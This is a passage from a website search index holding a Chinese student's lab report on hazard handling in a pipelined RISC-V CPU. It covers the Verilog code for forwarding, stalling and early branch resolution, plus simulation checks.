EX_MEM_rd != 0 && EX_MEM_rd == ID_EX_rs2 ) assign ForwardB = 2 'b01 ; else if ( MEM_WB_reg_write == 1 && MEM_WB_rd != 0 && MEM_WB_rd == ID_EX_rs2 ) assign ForwardB = 2 'b10 ; else assign ForwardB = 2 'b00 ; end end endmodule \u6b64\u5916\u9700\u8981\u4e00\u4e9b wire \u548c reg\uff1a wire [ 2 : 0 ] forwardA , forwardB ; reg [ 4 : 0 ] ID_EX_rs1 , ID_EX_rs2 ; // \u65f6\u5e8f\u66f4\u65b0\uff1a ID_EX_rs1 <= IF_ID_inst [ 19 : 15 ]; ID_EX_rs2 <= IF_ID_inst [ 24 : 20 ]; \u4ee5\u53ca\u6700\u540e\u8fde\u7ebf\u9009\u62e9 ALU \u8f93\u5165\uff1a ForwardingUnit forwarding ( . EX_MEM_rd ( EX_MEM_write_addr ), . MEM_WB_rd ( MEM_WB_write_addr ), . ID_EX_rs1 ( ID_EX_rs1 ), . ID_EX_rs2 ( ID_EX_rs2 ), . EX_MEM_reg_write ( EX_MEM_reg_write ), . MEM_WB_reg_write ( MEM_WB_reg_write ), . auipc ( ID_EX_auipc ), . alu_src_b ( ID_EX_alu_src ), . ForwardA ( forwardA ), . ForwardB ( forwardB ), ); Mux4x32 mux_alu_a ( . I0 ( ID_EX_data1 ), . I1 ( EX_MEM_alu_result ), . I2 ( write_data ), // WB \u6bb5\u9009\u62e9\u51fa\u6765\u7684\u5199\u56de\u5bc4\u5b58\u5668\u7684\u6570\u636e . I3 ( ID_EX_pc ), . s ( forwardA ), . o ( alu_data1 ) ); Mux4x32 mux_alu_b ( . I0 ( ID_EX_data2 ), . I1 ( EX_MEM_alu_result ), . I2 ( write_data ), . I3 ( ID_EX_imm ), . s ( forwardB ), . o ( alu_data2 ) );","title":"Forwarding \u673a\u5236"},{"location":"cs/system/cs2/lab2/#double-bump","text":"\u6839\u636e\u6307\u5bfc\uff0c\u4e3a\u4e86\u89e3\u51b3\u540c\u4e00\u4e2a\u5468\u671f\u5185\u5199\u5165 reg \u540e\u8bfb\u7684\u5192\u9669\u60c5\u51b5\uff0c\u9700\u8981\u4f7f\u7528 double bump \u673a\u5236\u3002\u5728\u5bc4\u5b58\u5668\u7ec4\u7684\u5b9a\u4e49\u4e2d\uff0c\u8bfb\u53d6\u7684\u7ed3\u679c\u662f\u76f4\u63a5 assign \u7684\uff0c\u800c\u5199\u5165\u624d\u662f\u65f6\u5e8f\u903b\u8f91\uff0c\u6240\u4ee5\u53ea\u8981\u8ba9\u5bc4\u5b58\u5668\u7ec4\u5728 CPU \u7684\u4e00\u4e2a\u5468\u671f\u4e2d\u5b8c\u6210\u5199\u5165\u5373\u53ef\uff08\u800c\u4e0d\u662f\u5728\u4e0b\u4e00\u4e2a\u5468\u671f\u5f00\u59cb\u7684\u4e0a\u5347\u6cbf\u5199\u5165\uff09\u3002\u8fd9\u6837\u6765\u8bf4\u53ea\u8981\u5c06\u5bc4\u5b58\u5668\u7ec4\u7684\u5199\u5165\u89e6\u53d1\u6539\u4e3a\u4e0b\u964d\u6cbf\uff08negedge\uff09\u5373\u53ef\uff1a always @( negedge clk or posedge rst ) begin if ( rst == 1 ) for ( i = 1 ; i < 32 ; i = i + 1 ) register [ i ] <= 0 ; // reset else if ( we == 1 && write_addr != 0 ) register [ write_addr ] <= write_data ; end","title":"Double bump \u673a\u5236"},{"location":"cs/system/cs2/lab2/#stall","text":"\u5bf9\u4e8e load-use \u7c7b\u6570\u636e\u5192\u9669\uff0c\u4ec5 forwarding \u662f\u4e0d\u591f\u7684\uff0c\u9700\u8981\u518d stall \u4e00\u4e2a\u5468\u671f\u624d\u53ef\u4ee5 forwarding\u3002 \u5982\u4e0a\u56fe\uff0c\u9700\u8981\u5728\u6bcf\u6761\u6307\u4ee4\u8fdb\u5165 ID \u9636\u6bb5\u540e\u8fdb\u884c\u9a8c\u8bc1\uff0c\u9a8c\u8bc1\u8fd9\u65f6\u5904\u4e8e EX \u9636\u6bb5\u7684\u6307\u4ee4\u662f\u4e0d\u662f load \u6307\u4ee4\uff08\u662f\u5426\u53d1\u751f\u4e86 D-Mem \u7684\u6570\u636e\u8bfb\u53d6\uff09\u7136\u540e\u68c0\u6d4b\u662f\u5426\u4e0e\u5f53\u524d\u6307\u4ee4\u6709\u6570\u636e\u51b2\u7a81\u3002\u5982\u679c\u6709\u51b2\u7a81\u5219\u9700\u8981 stall \u4e00\u4e2a\u5468\u671f\uff0c\u5177\u4f53\u4e3a\uff1a EX/MEM \u4e0e MEM/WB \u9636\u6bb5\u4ecd\u6b63\u5e38\u6267\u884c\u6d41\u8f6c \u5c06\u5f53\u524d\u7684 ID/EX \u9636\u6bb5\u5bc4\u5b58\u5668\u4e2d\u63a7\u5236\u4fe1\u53f7\u7f6e 0\uff0c\u5373\u76f8\u5f53\u4e8e\u63d2\u5165 bubble \u963b\u6b62 IF/ID \u9636\u6bb5\u5bc4\u5b58\u5668\u548c PC \u7684\u65f6\u5e8f\u66f4\u65b0\uff0c\u5b9e\u73b0\u6682\u505c \u9996\u5148\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a mem_read \u63a7\u5236\u4fe1\u53f7\u6765\u5224\u65ad\u662f\u5426\u53d1\u751f\u4e86\u6570\u636e\u8bfb\u53d6\uff08\u4e0d\u53ef\u4ee5\u901a\u8fc7 mem_write \u5224\u65ad\uff0c\u56e0\u4e3a mem_write \u4e3a 0 \u53ef\u80fd\u4e5f\u4e0d\u4f1a\u4f7f\u7528\u8bfb\u53d6\u7684\u6570\u636e\uff09\uff1a module Control ( ... output reg mem_read ); `include \"AluOp.vh\" always @( * ) begin ... mem_read = 0 ; case ( op_code ) 7 'b0000011 : begin // lw ... mem_read = 1 ; end ... endcase end endmodule \u7136\u540e\u540c\u7406\u5728 CPU \u4e2d\u521b\u5efa wire mem_read \u7528\u4e8e\u63a5\u6536\u5f53\u524d Control \u7684\u8f93\u51fa\uff0c\u7136\u540e\u901a\u8fc7\u65f6\u5e8f\u8d4b\u503c\u7ed9 reg ID_EX_mem_read \u5bc4\u5b58\u5668\u3002\u4e4b\u540e\u9700\u8981\u4e00\u4e2a StallUnit \u6765\u5224\u65ad\u662f\u5426\u9700\u8981\u6682\u505c\uff1a module StallUnit ( input ID_EX_mem_read , input [ 4 : 0 ] ID_EX_rd , input [ 4 : 0 ] IF_ID_rs1 , input [ 4 : 0 ] IF_ID_rs2 , output bubble_stop ); assign bubble_stop = ID_EX_mem_read && ( ID_EX_rd == IF_ID_rs1 || ID_EX_rd == IF_ID_rs2 ); endmodule \u8fde\u63a5\uff1a wire bubble_stop ; StallUnit stallunit ( . ID_EX_mem_read ( ID_EX_mem_read ), . ID_EX_rd ( ID_EX_write_addr ), . IF_ID_rs1 ( IF_ID_inst [ 19 : 15 ]), . IF_ID_rs2 ( IF_ID_inst [ 24 : 20 ]), . bubble_stop ( bubble_stop ) ); \u7136\u540e\u5728\u65f6\u5e8f\u66f4\u65b0\u90e8\u5206\u5224\u65ad bubble_stop \u662f\u5426\u4e3a 1\uff0c\u5982\u679c\u4e3a 1 \u5219\u8fdb\u884c\u7279\u6b8a\u5904\u7406\uff08\u4e0d\u66f4\u65b0 pc \u548c IF/ID\uff0c\u4e3a ID/EX \u63a7\u5236\u4fe1\u53f7\u8d4b 0\uff09\uff1a always @( posedge clk or posedge rst ) begin if ( rst ) begin ... end else begin if ( bubble_stop ) begin ID_EX_alu_op <= 4 'b0 ; ID_EX_pc_src <= 2 'b0 ; ID_EX_mem_to_reg <= 2 'b0 ; ID_EX_reg_write <= 1 'b0 ; ID_EX_alu_src <= 1 'b0 ; ID_EX_branch <= 1 'b0 ; ID_EX_b_type <= 1 'b0 ; ID_EX_auipc <= 1 'b0 ; ID_EX_mem_write <= 1 'b0 ; ID_EX_mem_read <= 1 'b0 ; end else begin pc <= pc_next ; IF_ID_pc <= pc ; IF_ID_inst <= inst ; ID_EX_pc_src <= pc_src ; ID_EX_mem_to_reg <= mem_to_reg ; ID_EX_reg_write <= reg_write ; ID_EX_alu_src <= alu_src ; ID_EX_branch <= branch ; ID_EX_b_type <= b_type ; ID_EX_auipc <= auipc ; ID_EX_alu_op <= alu_op ; ID_EX_mem_write <= mem_write_ ; ID_EX_mem_read <= mem_read ; end // update of EX/MEM and MEM/WB end end","title":"Stall \u673a\u5236"},{"location":"cs/system/cs2/lab2/#_3","text":"\u4ece\u7ed9\u51fa\u7684\u6c47\u7f16\u4e2d\u6311\u53d6\u4e86\u4e00\u5c0f\u90e8\u5206\u7528\u6765\u6d4b\u8bd5\u524d\u9762\u5904\u7406\u8fc7\u7684\u6570\u636e\u5192\u9669\uff1a addi x1 , x0 , 1 addi x2 , x0 , 1 addi x4 , x0 , 5 add x3 , x1 , x2 add x1 , x2 , x3 add x2 , x1 , x3 ld x4 , 0 ( x2 ) addi x4 , x4 , -1 \u8f7d\u5165\u7ed9\u51fa\u7684\u521d\u59cb RAM\uff0c\u4eff\u771f\u6ce2\u5f62\u53ca\u5176\u5206\u6790\u5982\u4e0b\uff0c\u53ef\u89c1\u8ba1\u7b97\u7ed3\u679c\u5747\u6b63\u786e\uff0c\u6682\u505c\u4e5f\u7b26\u5408\u9884\u671f","title":"\u6d4b\u8bd5"},{"location":"cs/system/cs2/lab2/#_4","text":"","title":"\u63a7\u5236\u5192\u9669"},{"location":"cs/system/cs2/lab2/#_5","text":"\u6309\u7167\u4e4b\u524d\u7684\u8bbe\u8ba1\uff0c\u5173\u4e8e\u5206\u652f\u8df3\u8f6c\u8bed\u53e5\u7684 pc_next \u8ba1\u7b97\u662f\u5728 MEM \u6bb5\u5b8c\u6210\u7684\uff08\u5229\u7528\u4ece EX \u6bb5\u4f20\u51fa\u6765\u7684 alu_result\uff09\uff0c\u4f46\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5bf9\u4e8e\u6bcf\u4e00\u6761\u5206\u652f\u8df3\u8f6c\u8bed\u53e5\u540e\u9762\u90fd\u9700\u8981\u7b49\u5f85\u4e09\u4e2a\u5468\u671f\u624d\u80fd\u5f97\u5230\u6b63\u786e pc\u3002\u800c\u5b9e\u9645\u4e0a\u5728 ID \u6bb5\u5c31\u53ef\u4ee5\u6839\u636e\u4ece\u5bc4\u5b58\u5668\u4e2d\u8bfb\u51fa\u6765\u7684\u7ed3\u679c\u5224\u65ad\u662f\u5426\u9700\u8981\u5206\u652f\u3002\u6240\u4ee5\u53ef\u4ee5\u5c06 MEM \u9636\u6bb5\u7684 pc mux \u79fb\u5230 ID \u6bb5\uff0c\u8fd9\u6837\u5c31\u53ea\u9700\u8981\u7b49\u5f85\u4e00\u4e2a\u5468\u671f\u3002 \u8fd9\u6837\u7b49\u5f85\u4e00\u4e2a\u5468\u671f\u548c\u524d\u9762\u7684 stall \u5c31\u5f88\u76f8\u4f3c\u4e86\uff0c\u4f46\u662f\u8fd8\u6709\u4e00\u4e9b\u4e0d\u540c\uff0c\u524d\u9762\u6570\u636e\u5192\u9669\u7684 stall \u662f\u5c06\u5f53\u524d\u6307\u4ee4\u6682\u505c\uff0c\u5373\u53d8\u6210\u4e00\u4e2a bubble \u4f20\u4e0b\u53bb\u800c\u5f53\u524d\u6307\u4ee4\u7b49\u5f85\u3002\u800c\u6b64\u5904\u7684\u5f53\u524d\u6307\u4ee4\u662f branch \u6307\u4ee4\uff0c\u9700\u8981\u7ee7\u7eed\u4f20\u4e0b\u53bb\uff0c\u800c\u5728\u5176\u540e\u63d2\u5165\u4e00\u6761 bubble\uff0c\u6240\u4ee5\u5b9e\u9645\u7684\u64cd\u4f5c\u4e3a\uff1a pc \u53ef\u4ee5\u7ee7\u7eed\u66f4\u65b0\uff08\u4f46\u662f\u5982\u679c\u68c0\u6d4b\u5230\u4e86\u662f\u8df3\u8f6c\u6307\u4ee4\uff0c\u5219\u5728\u9009\u62e9\u5f53\u524d pc_next \u65f6\u4e0d\u4f20\u5165 pc+4 \u800c\u662f pc\uff0c\u5373\u6682\u505c\u4e00\u6761\uff09 IF/ID \u6bb5\u7684 pc \u53ef\u4ee5\u968f\u610f\uff0cinst \u8bbe\u7f6e\u4e3a 32'h00000013\uff0c\u5373 nop\uff08\u76f8\u5f53\u4e8e\u5728\u540e\u9762\u63d2\u5165\u4e86\u4e00\u6761 bubble\uff09 \u5269\u4e0b\u7684\u90e8\u5206\u90fd\u6b63\u5e38\u66f4\u65b0\u6d41\u8f6c \u56e0\u6b64\u9996\u5148\u9700\u8981\u4e3a\u63a7\u5236\u6a21\u5757\u52a0\u4e00\u4e2a jump \u63a7\u5236\u4fe1\u53f7\u5224\u65ad\u662f\u5426\u662f\u5206\u652f\u8df3\u8f6c\u8bed\u53e5\uff1a module Control ( ... output reg jump ); `include \"AluOp.vh\" always @( * ) begin ... jump = 0 ; case ( op_code ) ... 7 'b1100011 : begin // bne beq ... jump = 1 ; end 7 'b1101111 : begin // jal ... jump = 1 ; end 7 'b1100111 : begin // jalr ... jump = 1 ; end ... endcase end endmodule \u7136\u540e\u662f\u65b0\u589e wire jump \u7528\u6765\u4f20\u8f93\uff0c\u4ee5\u53ca\u9488\u5bf9\u4e8e jump \u60c5\u51b5 stall \u7684\u65f6\u5e8f\u66f4\u65b0\uff1a always @( posedge clk or posedge rst ) begin if ( rst ) begin ... end else begin if ( bubble_stop ) begin ... end else if ( jump ) begin pc <= pc_next ; IF_ID_pc <= pc ; IF_ID_inst <= 32'h00000013 ; ID_EX_pc_src <= pc_src ; ID_EX_mem_to_reg <= mem_to_reg ; ID_EX_reg_write <= reg_write ; ID_EX_alu_src <= alu_src ; ID_EX_branch <= branch ; ID_EX_b_type <= b_type ; ID_EX_auipc <= auipc ; ID_EX_alu_op <= alu_op ; ID_EX_mem_write <= mem_write_ ; ID_EX_mem_read <= mem_read ; end else begin ... \u6700\u540e\u662f\u5728 ID \u9636\u6bb5\u7684 pc \u9009\u62e9\u5668\uff1a assign jal_addr = IF_ID_pc + imm ; assign jalr_addr = read_data1 + read_data2 ; MuxPC mux_pc ( . I0 ( jump ? pc : pc + 4 ), . I1 ( jalr_addr ), . I2 ( jal_addr ), . I3 ( jal_addr ), . s ( pc_src ), . branch ( branch ), . b_type ( b_type ), . alu_res ( read_data1 ^ read_data2 ), . o ( pc_next ) );","title":"\u5206\u652f\u5224\u65ad\u524d\u79fb"},{"location":"cs/system/cs2/lab2/#_6","text":"\u524d\u9762\u5c06 pc \u9009\u62e9\u5668\u63d0\u524d\u5230 ID \u9636\u6bb5\u5e76 stall \u662f\u4e0d\u591f\u7684\uff0c\u56e0\u4e3a\u4e00\u822c\u5bf9\u4e8e\u5faa\u73af\uff0c\u5728 branch \u8bed\u53e5\u68c0\u67e5\u7684\u524d\u4e00\u6761\u4f1a\u6d89\u53ca\u5230\u5faa\u73af\u53d8\u91cf\u5bc4\u5b58\u5668\u7684\u4fee\u6539\uff0c\u4f8b\u5982\uff1a addi x1 , x1 , -1 bne x1 , x0 , loop \u6b64\u65f6 bne \u9700\u8981\u5728 ID \u9636\u6bb5\u8bfb\u53d6 x1\uff0c\u4f46\u662f\u5728 ID \u9636\u6bb5\u65f6\u4e0a\u4e00\u6761\u6307\u4ee4\u4ecd\u5728 EX \u9636\u6bb5\uff0cx1 \u8fd8\u6ca1\u6709\u66f4\u65b0\u3002\u6240\u4ee5\u9700\u8981 stall \u4e00\u4e2a\u5468\u671f\u7b49\u5f85\u4e0a\u4e00\u6761\u6307\u4ee4 EX \u9636\u6bb5\u7ed3\u675f\uff0c\u7136\u540e\u5c06 ALU \u7ed3\u679c\u901a\u8fc7 forwarding \u4f20\u7ed9 bne \u7684 ID \u9636\u6bb5\u7136\u540e\u8fdb\u884c\u5224\u65ad\u3002\u5373\u4e0b\u56fe\uff1a \u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u5904\u7684\u6570\u636e\u5192\u9669\u7684 stall \u65b9\u5f0f\u548c\u524d\u9762\u6570\u636e\u5192\u9669\u4e00\u6837\uff0c\u56e0\u6b64\u53ea\u9700\u8981\u5728 StallUnit \u4e2d\u5bf9 bubble_stop \u52a0\u4e00\u4e2a\u6761\u4ef6\u5373\u53ef\uff08\u4e0a\u4e00\u6761\u6307\u4ee4\u6709\u5bc4\u5b58\u5668\u5199\u5165\uff0c\u4e14\u4e0e\u8bfb\u53d6\u7684\u5bc4\u5b58\u5668\u4ea7\u751f\u4e86\u51b2\u7a81\uff09\u3002\u7136\u540e ID \u9636\u6bb5\u7684 forwarding \u9700\u8981\u5355\u72ec\u5199\u4e00\u4e0b\u3002\u5728 branch \u6307\u4ee4\u540e\u9762\u7684 bubble \u5373\u4e3a\u524d\u9762\u5199\u8fc7\u7684 stall\u3002 \u56e0\u6b64\u4ee3\u7801\u4e0a\u7684\u4fee\u6539\uff1a\u5bf9\u4e8e StallUnit \u7684\u4fee\u6539\uff1a module StallUnit ( ... input jump , input ID_EX_reg_write , ... ); assign bubble_stop = (...) || ( jump && ID_EX_reg_write && ID_EX_rd != 0 && ( ID_EX_rd == IF_ID_rs1 || ID_EX_rd == IF_ID_rs2 )); \u5728 ID \u9636\u6bb5\u7684 forwarding\uff1a wire [ 31 : 0 ] reg1 , reg2 ; assign reg1 = ( jump && EX_MEM_reg_write && ( EX_MEM_write_addr != 0 ) && ( EX_MEM_write_addr == IF_ID_inst [ 19 : 15 ])) ? EX_MEM_alu_result : read_data1 ; assign reg2 = ( jump && EX_MEM_reg_write && ( EX_MEM_write_addr != 0 ) && ( EX_MEM_write_addr == IF_ID_inst [ 24 : 20 ])) ? EX_MEM_alu_result : read_data2 ; assign jalr_addr = reg1 + reg2 ; MuxPC mux_pc ( ... . alu_res ( reg1 ^ reg2 ), ... );","title":"\u5904\u7406\u63a7\u5236\u5192\u9669\u4e2d\u7684\u6570\u636e\u5192\u9669"},{"location":"cs/system/cs2/lab2/#_7","text":"\u5728\u524d\u9762\u7b80\u5355\u5904\u7406\u4e86\u6570\u636e\u5192\u9669\u548c\u63a7\u5236\u5192\u9669\u4e4b\u540e\uff0c\u7ed9\u51fa\u7684\u7a0b\u5e8f\u4ecd\u7136\u4e0d\u80fd\u5b8c\u5168\u6b63\u786e\u8fd0\u884c\uff0c\u8fd8\u5b58\u5728\u4e00\u4e9b\u758f\u6f0f\u7684\u6570\u636e\u5192\u9669\uff1a","title":"\u5176\u5b83\u60c5\u51b5\u5f15\u8d77\u7684\u5192\u9669"},{"location":"cs/system/cs2/lab2/#r-store","text":"\u5982\u679c R \u578b\u6307\u4ee4\u4fee\u6539\u4e86\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u7136\u540e\u901a\u8fc7 store \u5b58\u50a8\u5b83\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5e76\u4e0d\u4f1a store \u6b63\u786e\u7684\u503c\uff0c\u56e0\u4e3a EX \u9636\u6bb5\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\uff08\u9ed1\u3001\u7ea2\u8272\u4e3a\u539f\u6765\u7684\uff09\uff1a \u5176\u4e2d\u5bf9\u4e8e store \u6307\u4ee4\uff0cALU \u548c\u524d\u9762\u4e24\u4e2a mux \u90fd\u4f1a\u7528\u5230\uff08\u7528\u6765\u8ba1\u7b97\u5199\u5165\u5730\u5740\uff09\uff0c\u800c\u5199\u5165\u7684\u503c\u5b9e\u9645\u4e0a\u662f\u76f4\u63a5\u4ece\u5bc4\u5b58\u5668\u8bfb\u53d6\u7684 data2 \u63a5\u5165\u7684\uff08\u5373\u7ea2\u8272\u7ebf\uff09\uff0c\u8fd9\u91cc\u5e76\u6ca1\u6709\u5904\u7406\u6570\u636e\u5192\u9669\u3002\u800c\u4e14\u5199\u5165\u503c\u4e5f\u65e0\u6cd5\u501f\u7528\u524d\u9762\u5199\u8fc7\u7684 forwarding\uff08\u56e0\u4e3a\u6b64\u65f6\u90fd\u5728\u4f7f\u7528\uff09\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4ece ForwardingUnit \u518d\u5224\u65ad\u3001\u5f15\u51fa\u4e00\u4e2a ForwardC \u4fe1\u53f7\uff0c\u6765\u9009\u62e9\u5199\u5165\u6570\u636e\uff0c\u540c\u7406\uff0c\u53ef\u80fd\u6765\u81ea EX/MEM \u6216 MEM/WB\u3002 \u56e0\u6b64\u4fee\u6539 ForwardingUnit\uff1a module ForwardingUnit ( ... output reg [ 1 : 0 ] ForwardC // 00 \u6765\u81ea data2\u300101 \u6765\u81ea EX/MEM\u300110 \u6765\u81ea MEM/WB ); if ( EX_MEM_reg_write && EX_MEM_rd != 0 && EX_MEM_rd == ID_EX_rs2 ) assign ForwardC = 2 'b01 else if ( MEM_WB_reg_write && MEM_WB_rd != 0 && MEM_WB_rd == ID_EX_rs2 ) assign ForwardC = 2 'b01 else assign ForwardC = 2 'b00 ; \u4ee5\u53ca\u5728 EX \u9636\u6bb5\u589e\u52a0\u4e00\u4e2a\u56db\u8def\u9009\u62e9\u5668\uff08\u6709\u4e00\u8def\u4e0d\u7528\uff09\u6765\u9009\u62e9\u6700\u7ec8\u8981\u8d4b\u503c\u7ed9 EX_MEM_data2 \u7684\u503c\uff08\u5373\u5728 MEM \u9636\u6bb5\u8981\u8fdb\u884c\u5199\u5165\u7684\u503c\uff09\uff1a wire [ 1 : 0 ] forwardC ; wire [ 31 : 0 ] ex_mem_data2 ; Mux4x32 mux_data2 ( . I0 ( ID_EX_data2 ), . I1 ( EX_MEM_alu_result ), . I2 ( write_data ), . I3 ( 32'h00000000 ), . s ( forwardC ), . o ( ex_mem_data2 ) ); \u4ee5\u53ca\u5c06\u65f6\u5e8f\u66f4\u65b0\u91cc\u7684\u66f4\u65b0 EX_MEM_data2 \u4e3a ID_EX_data2 \u6539\u4e3a ex_mem_data2\uff1a ... EX_MEM_data2 <= ex_mem_data2 ; ...","title":"R \u578b\u6307\u4ee4\u540e store"},{"location":"cs/system/cs2/lab2/#lui-r","text":"\u524d\u9762\u7684 Forwarding \u4ecd\u7136\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u6bd4\u5982\u5728 lui \u6307\u4ee4\u548c\u5176\u540e\u9762\u7684 R \u578b\u6307\u4ee4\u53d1\u751f\u51b2\u7a81\uff1a lui x1 , 0x0001 add x2 , x1 , x3 \u6b64\u65f6\u7684 add \u8bed\u53e5\u5e76\u4e0d\u4f1a\u6b63\u786e\u5904\u7406\u4e0e\u524d\u9762 lui \u4ea7\u751f\u7684\u6570\u636e\u5192\u9669\uff0c\u56e0\u4e3a add \u8bed\u53e5\u8bfb\u53d6 x1 \u53d1\u751f\u51b2\u7a81\uff0c\u800c\u4e0a\u4e00\u6761\u8bed\u53e5\u6b63\u5728\u4f7f\u7528\uff0c\u6240\u4ee5\u6309\u7167\u524d\u9762\u5199\u7684\u4f1a\u53bb\u8bfb\u53d6 EX_MEM \u5bc4\u5b58\u5668\u4e2d\u7684 alu_result \u4f5c\u4e3a x1 \u7684\u503c\u3002\u4f46\u5b9e\u9645\u4e0a lui \u5199\u56de\u5bc4\u5b58\u5668\u7684\u503c\u5e76\u4e0d\u662f ALU \u7684\u8ba1\u7b97\u7ed3\u679c\uff0c\u800c\u662f lui \u6307\u4ee4\u7684\u7acb\u5373\u6570\uff08\u7531 mem_to_reg \u4fe1\u53f7\u51b3\u5b9a\uff09\u3002 \u53e6\u4e00\u79cd\u60c5\u51b5\u662f jal/jalr \u6307\u4ee4\u8df3\u8f6c\u5230\u7684\u4f4d\u7f6e\u5904\u6709\u4e00\u6761\u6307\u4ee4\u9700\u8981\u8bfb\u53d6\u8fd4\u56de\u5730\u5740\uff08\u4e5f\u5c31\u662f pc+4\uff09\uff0c\u8fd9\u65f6\u5199\u56de\u5bc4\u5b58\u5668\u7684\u4e5f\u4e0d\u662f ALU \u7684\u7ed3\u679c\uff0c\u800c\u662f\u5f53\u524d\u8df3\u8f6c\u6307\u4ee4\u7684 pc+4\u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\u90fd\u53ef\u4ee5\u901a\u8fc7\u5224\u65ad mem_to_reg \u6765\u89e3\u51b3\u3002\u6240\u4ee5\u9700\u8981\u4fee\u6539 ForwardingUnit\uff0c\u5c06 ForwardA\u3001ForwardB \u4fe1\u53f7\u6269\u5c55\u4e00\u4f4d\uff1a module ForwardingUnit ( ... output reg [ 2 : 0 ] ForwardA , // 000 \u6765\u81ea\u5bc4\u5b58\u5668\uff0c001 \u6765\u81ea EX/MEM\uff0c010 \u6765\u81ea MEM/WB\uff0c011 \u6765\u81ea PC // 100 \u6765\u81ea EX/MEM \u7684 PC + 4\uff0c101 \u6765\u81ea MEM/WB \u7684 PC + 4 // 110 \u6765\u81ea EX/MEM \u7684 imm\uff0c111 \u6765\u81ea MEM/WB \u7684 imm output reg [ 2 : 0 ] ForwardB , // ... output reg [ 1 : 0 ] ForwardC ); always @( * ) begin if ( auipc ) begin assign ForwardA = 3 'b011 ; end else begin if ( EX_MEM_reg_write == 1 && EX_MEM_rd != 0 && EX_MEM_rd == ID_EX_rs1 ) begin if ( EX_MEM_mem_to_reg == 2 'b01 ) assign ForwardA = 3 'b110 ; else if ( EX_MEM_mem_to_reg == 2 'b10 ) assign ForwardA = 3 'b100 ; else assign ForwardA = 3 'b001 ; end else if ( MEM_WB_reg_write == 1 && MEM_WB_rd != 0 && MEM_WB_rd == ID_EX_rs1 ) begin if ( MEM_WB_mem_to_reg == 2 'b01 ) assign ForwardA = 3 'b111 ; else if ( MEM_WB_mem_to_reg == 2 'b10 ) assign ForwardA = 3 'b101 ; else assign ForwardA = 3 'b010 ; end else begin assign ForwardA = 3 'b000 ; end end if ( alu_src_b ) begin assign ForwardB = 3 'b011 ; end else begin if ( EX_MEM_reg_write == 1 && EX_MEM_rd != 0 && EX_MEM_rd == ID_EX_rs2 ) begin if ( EX_MEM_mem_to_reg == 2 'b01 ) assign ForwardB = 3 'b110 ; else if ( EX_MEM_mem_to_reg == 2 'b10 ) assign ForwardB = 3 'b100 ; else assign ForwardB = 3 'b001 ; end else if ( MEM_WB_reg_write == 1 && MEM_WB_rd != 0 && MEM_WB_rd == ID_EX_rs2 ) begin if ( MEM_WB_mem_to_reg == 2 'b01 ) assign ForwardB = 3 'b111 ; else if ( MEM_WB_mem_to_reg == 2 'b10 ) assign ForwardB = 3 'b101 ; else assign ForwardB = 3 'b010 ; end else begin assign ForwardB = 3 'b000 ; end end ... // for ForwardC end endmodule \u4ee5\u53ca\u9700\u8981\u4fee\u6539 ALU \u524d\u9009\u62e9\u8f93\u5165\u7684\u4e24\u4e2a\u5bc4\u5b58\u5668\uff0c\u6539\u4e3a\u516b\u8def\u9009\u62e9\u5668\uff1a wire [ 2 : 0 ] forwardA , forwardB ; Mux8x32 mux_alu_a ( . I0 ( ID_EX_data1 ), . I1 ( EX_MEM_alu_result ), . I2 ( write_data ), . I3 ( ID_EX_pc ), . I4 ( EX_MEM_pc + 4 ), . I5 ( MEM_WB_pc + 4 ), . I6 ( EX_MEM_imm ), . I7 ( MEM_WB_imm ), . s ( forwardA ), . o ( alu_data1 ) ); Mux8x32 mux_alu_b ( . I0 ( ID_EX_data2 ), . I1 ( EX_MEM_alu_result ), . I2 ( write_data ), . I3 ( ID_EX_imm ), . I4 ( EX_MEM_pc + 4 ), . I5 ( MEM_WB_pc + 4 ), . I6 ( EX_MEM_imm ), . I7 ( MEM_WB_imm ), . s ( forwardB ), . o ( alu_data2 ) );","title":"lui \u540e R \u578b\u6307\u4ee4"},{"location":"cs/system/cs2/lab2/#_8","text":"\u8fd0\u884c\u6240\u7ed9\u7684 lab2.s \u7a0b\u5e8f\uff0c\u8f7d\u5165 lab2-ram.coe \u548c lab2-rom.coe\uff0c\u4ee5 Core_tb.sv \u4e3a\u9876\u5c42\u6a21\u5757\u8fdb\u884c\u4eff\u771f\u3002","title":"\u4eff\u771f\u6d4b\u8bd5\u53ca\u5206\u6790"},{"location":"cs/system/cs2/lab2/#_9","text":"\u4eff\u771f\u6ce2\u5f62\u5982\u4e0b\uff08\u6709\u90e8\u5206\u5faa\u73af\u7701\u7565\u4e86\uff09\uff1a \u6574\u4e2a\u5bc4\u5b58\u5668\u7ec4\u503c\u7684\u53d8\u5316\uff08\u4e0a\u5341\u8fdb\u5236\uff0c\u4e0b\u5341\u516d\u8fdb\u5236\uff09\uff1a","title":"\u4eff\u771f\u7ed3\u679c"},{"location":"cs/system/cs2/lab2/#_10","text":"\u6839\u636e\u6c47\u7f16\u4ee3\u7801\u5206\u6790\u6ce2\u5f62\uff1a \u53ef\u4ee5\u770b\u51fa\uff0c\u7ed3\u679c\u5747\u6b63\u786e\uff0c\u4e14\u6309\u7167\u9884\u671f\u8fdb\u884c stall\u3001\u8df3\u8f6c\u3002","title":"\u7ed3\u679c\u5206\u6790"},{"location":"cs/system/cs2/lab2/#_11","text":"","title":"\u601d\u8003\u9898"},{"location":"cs/system/cs2/lab2/#lab-2-1","text":"\u8bf7\u4f60\u5bf9\u6570\u636e\u51b2\u7a81\u60c5\u51b5\u8fdb\u884c\u5206\u6790\u5f52\u7eb3\uff0c\u8bd5\u7740\u5c06\u4ed6\u4eec\u5206\u7c7b\u5217\u51fa\u3002 RISC-V \u6d41\u6c34\u7ebf\u6570\u636e\u51b2\u7a81\u5f52\u7eb3\u540e\u672c\u8d28\u5176\u5b9e\u5c31\u662f\u4e00\u79cd\uff0c\u5373\u5728\u5c1a\u672a\u5199\u5165\u5bc4\u5b58\u5668\u65f6\u8bfb\u53d6\u5176\u503c\uff08RAW\uff09\uff0c\u5176\u5305\u542b\u5f88\u591a\u79cd\u7ec6\u5206\u7684\u60c5\u51b5\uff1a - use-use \u51b2\u7a81 - load-use \u51b2\u7a81 - use-store \u51b2\u7a81 